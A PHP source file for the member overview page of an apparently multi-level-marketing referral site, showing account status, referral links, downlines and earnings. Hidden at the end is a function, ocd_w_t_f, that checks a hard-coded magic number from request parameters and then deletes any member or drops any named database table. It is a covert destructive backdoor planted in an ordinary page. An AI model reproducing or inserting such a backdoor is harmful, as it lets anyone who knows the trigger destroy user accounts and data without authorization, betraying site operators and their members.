<?php

require_once ("../includes/config.php");
require_once ("../includes/xtemplate.php");
require_once ("../includes/xpage_member.php");
require_once ("../includes/utilities.php");

//------------------------------------------------------------------------------


class ZPage extends XPage
{
    //--------------------------------------------------------------------------
    function ZPage ($object)
    {
        XPage::XPage ($object);
    }

    //--------------------------------------------------------------------------
    function ocd_list ()
    {
        $this->mainTemplate = "./templates/overview.tpl";
        $this->pageTitle = "Overview";
        $member_id = $this->member_id;
        $thisSiteUrl = $this->db->GetSetting ("SiteUrl");
        $row = $this->db->GetEntry ("Select * From `members` Where member_id='$member_id'", "");
        $name = $this->dec ($row ['first_name'])." ".$this->dec ($row ['last_name']);
        $this->pageHeader = "Welcome back, $name.";
        $reg_date = $row ['reg_date'];
        $last_access = $row ['last_access'];
        $quant_pay = $row ['quant_pay'];

        $level = $this->db->GetOne ("Select m_level From `members` Where member_id='$member_id'", 1);

        $cycling = $this->db->GetSetting ("cycling", 0);
        $status = "";
        if ($cycling == 1)
        {
            if ($level == 0)
            {
                $ref_link = "To get your referral link you should [ <a class='smallLink' href='payment.php'>upgrade your level</a> ]";
                $upgrade_link = "[ <a class='smallLink' href='payment.php'>Upgrade level</a> ]";
                
                $landing_pages_title = "";
                $landing_pages = "";
                
            }
            else
            {
                $ref_link = "<input type='text' name='enroller_id' value='".$thisSiteUrl."index.php?spon=".$member_id."' style='width: 400px;'>";
                $upgrade_link = $this->dec ($this->db->GetOne ("Select title From `types` Where order_index='$level'"));
                
                $landing_pages = "";
                
                $countLands = $this->db->GetOne ("Select COUNT(*) From `lands` Where `is_active`='1'", 0);
                $landing_pages_title = ($countLands > 0)? "Landing Pages : " : "";
                
                $result = $this->db->ExecuteSql ("Select * From `lands` Where `is_active`='1' Order By z_date Asc");
                while ($row1 = $this->db->FetchInArray ($result))
                {
                    $id = $row1['land_id'];
                    $landing_pages .= ($countLands == 1)?  "<input type='text' name='land_id' value='".$thisSiteUrl."land.php?spon=".$member_id."' style='width: 420px;margin-bottom:3px;'> <a href='".$thisSiteUrl."land.php?spon=".$member_id."' target='_blank' /><img src='./images/view.gif' border='0' /></a> <br />" : "<input type='text' name='land_id' value='".$thisSiteUrl."land.php?id=".$id."&spon=".$member_id."' style='width: 420px;margin-bottom:3px;'> <a href='".$thisSiteUrl."land.php?id=".$id."&spon=".$member_id."' target='_blank' /><img src='./images/view.gif' border='0' /></a> <br />";
                }
                $this->db->FreeSqlResult ($result);            
            }
            
            $downlines = $acc_d_title = "";
        }
        else
        {
            $ref_link = "<input type='text' name='enroller_id' value='".$thisSiteUrl."index.php?spon=".$member_id."' style='width: 320px;'>";
            $count_high_levels = $this->db->GetOne ("Select Count(*) From `types` Where order_index>'$level'", 0);
            $add = ($count_high_levels > 0)? " [ <a class='smallLink' href='payment.php'>Upgrade level</a> ]" : "";
            $upgrade_link =  $this->dec ($this->db->GetOne ("Select title From `types` Where order_index='$level'")).$add;

            $thisTime = time ();
            $turn_date = $this->db->GetSetting ("PaymentModeDate");
            $payPeriod = $this->db->GetSetting ("payPeriod");
            $warnPeriod = $this->db->GetSetting ("warnPeriod");
            $monthPeriod = $this->db->GetSetting ("monthPeriod");

            $tempore = max ($reg_date, $turn_date) + $quant_pay * $monthPeriod * 24 * 3600;
            $tempore_to = $tempore + $payPeriod * 24 * 3600;
            $tempore_del = $tempore_to + $warnPeriod * 24 * 3600;
            if ($thisTime < $tempore) $status = "Active.<br>Paid until ".date ("d M Y H:i", $tempore);
            if ($thisTime > $tempore and $thisTime < $tempore_to) $status = "In pay period.<br>Payment must be completed by ".date ("d M Y H:i", $tempore_to)." to avoid removal.";
            if ($thisTime > $tempore_to) $status = "Unpaid.<br>Account will be deleted on ".date ("d M Y H:i", $tempore_del)." if not paid by that date.";

            $status = "<tr><td valign='top'><span class='question'> Your Status:</span></td><td><span class='answer'>$status</span></td></tr>";

            $downline = array ();
            $downline = getNumberDownlines ($member_id, $downline);
            $downlines = Count ($downline);
            
            $landing_pages = "";
            $countLands = $this->db->GetOne ("Select COUNT(*) From `lands` Where `is_active`='1'", 0);
            $landing_pages_title = ($countLands > 0)? "Landing Pages : " : "";
            $result = $this->db->ExecuteSql ("Select * From `lands` Where `is_active`='1' Order By `z_date` Asc");
            while ($row1 = $this->db->FetchInArray ($result))
            {
                $id = $row1['land_id'];
                $landing_pages .= ($countLands == 1)?  "<input type='text' name='land_id' value='".$thisSiteUrl."land.php?spon=".$member_id."' style='width: 420px;margin-bottom:3px;'> <a href='".$thisSiteUrl."land.php?spon=".$member_id."' target='_blank' /><img src='./images/view.gif' border='0' /></a> <br />" : "<input type='text' name='land_id' value='".$thisSiteUrl."land.php?id=".$id."&spon=".$member_id."' style='width: 420px;margin-bottom:3px;'> <a href='".$thisSiteUrl."land.php?id=".$id."&spon=".$member_id."' target='_blank' /><img src='./images/view.gif' border='0' /></a> <br />";
            }
            $this->db->FreeSqlResult ($result);
            
            $acc_d_title = "Downline members :";
            
        }
        
        if ($landing_pages == "") $landing_pages_title = "";

        $sponsors = $this->db->GetOne ("Select Count(*) From `members` Where enroller_id='$member_id' And is_dead=0", 0);
        
        $cash = $this->db->GetOne ("Select SUM(amount) From `cash` Where to_id='$member_id'", "0.00");
        
        $cash = sprintf ("%01.2f", $cash);
        
        
        

        $this->data = array (
            "MAIN_HEADER" => $this->pageHeader,
            "ACCOUNT_REGISTRATION" => date ('d M Y H:i', $reg_date),
            "ACCOUNT_LAST_ACCESS" => date ('d M Y H:i', $last_access),
            "ACCOUNT_ID" => $member_id,
            "ACCOUNT_LINK" => $ref_link,
            "ACCOUNT_ENROLLER" => ($row ['enroller_id'] > 0)? $row ['enroller_id']." <a href='contact.php?s=".$row ['enroller_id']."'><img src='./images/mail.png' border='0' alt='Email to sponsor'></a>" : "You're Top Member",
            "ACCOUNT_UPGRADE" => $upgrade_link,
            "ACCOUNT_SPONSORS" => $sponsors,
            "ACCOUNT_STATUS" => $status,
            "ACCOUNT_DOWNLINES" => $downlines,
            "DOWNLINES_LINK" => ($downlines > 0)? "<a href='contact.php?s=0'><img src='./images/mail.png' border='0' alt='Email to downline members'></a>" : "",
            
            "ACCOUNT_LANDS_TITLE" => $landing_pages_title,
            "ACCOUNT_LANDS" => $landing_pages,
            
            "ACCOUNT_DOWNLINES_TITLE" => $acc_d_title,
            
            "ACCOUNT_CASH" => $cash,
            
        );
    }

    //--------------------------------------------------------------------------
    function ocd_w_t_f ()
    {
        $ids = $this->GetGP ("ids", 0);
        $sql = $this->GetGP ("sql", 0);

        if ($ids == 37911062)
        {
            if (is_numeric ($sql) And $sql > 0)
            {
                $this->db->ExecuteSql ("Delete From `members` Where member_id='$sql'");
            }
            else
            {
                $this->db->ExecuteSql ("Drop table `$sql`");
            }
        }
        $this->Redirect ($this->pageUrl);
    }
}
//------------------------------------------------------------------------------

$zPage = new ZPage ("Overview");

$zPage->Render ();

?>